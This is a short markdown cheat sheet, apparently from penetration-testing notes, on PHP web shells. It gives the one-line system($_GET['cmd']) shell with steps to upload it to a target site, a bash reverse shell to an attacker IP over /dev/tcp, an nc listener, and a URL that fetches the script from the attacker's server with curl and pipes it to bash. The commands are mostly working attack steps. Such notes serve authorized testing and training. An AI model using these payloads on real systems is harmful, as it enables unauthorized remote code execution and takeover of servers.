# PHP Quick Reference

## Contents
- [One-Liner: `system()` Function](#one-liner-system-function)
  - [Syntax](#syntax)
  - [Use as a Test](#use-as-a-test)
  - [Reverse Shell](#reverse-shell)
    - [Linux Payload](#linux-payload)
    - [Start a Listener](#start-a-listener)
    - [Spin Up a Local Web Server](#spin-up-a-local-web-server)
    - [Build a URL with curl to Execute](#build-a-url-with-curl-to-execute)

## One-Liner: system() Function
- This is a [PHP function](https://www.php.net/manual/en/function.system.php) that is used to execute a command.
- It uses the PHP `system()` function to execute commands that are being passed through `cmd` HTTP request `GET` parameter.
- The `cmd` is a parameter. You pass the argument to that parameter via the URL (see below).
- Reference: [An Introduction to Web Shells](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)

### Syntax
- This is the PHP web shell in its most simple form: 
```
<?php system($_GET["cmd"]); ?>
```

### Use as a Test
- Create a PHP file and upload it to a target site that's running PHP:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
- Build a URL to execute that script with a command (specific to the operating system o/s).
- If you get a response from the command you send to the o/s via the PHP `system()` function, you know you can execute arbitrary code on the target.
```
# for Linux:
http://[target domain]/shell.php?cmd=id

# for Windows:
http://[target domain]/shell.php?cmd=dir
```

### Reverse Shell

#### Linux Payload
- Create a shell script file containing a [Bash one-liner](bash.md) for a reverse shell.
- Use vim or some other editor and create `shell.sh` containing the following: 
```
#!/bin/bash
bash -i &> /dev/tcp/[attack ip]/[port] 0>&1
```

#### Start a Listener
- On your attack machine, spin up a listener:
```
nc -nvlp 1234
```

#### Spin Up a Local Web Server
- Start a simple Python web server on your local attack machine to serve up the bash file.
- This command must be run from the subdir that contains `shell.sh`.
```
python3 -m http.server 8000
```

#### Build a URL with curl to Execute
- We combine the PHP one-liner with a curl command to fetch `shell.sh`, and then we pipe it to Bash in order to execute it.
```
http://[target domain]/shell.php?cmd=curl%20[local attack ip]:8000/shell.sh|bash
```











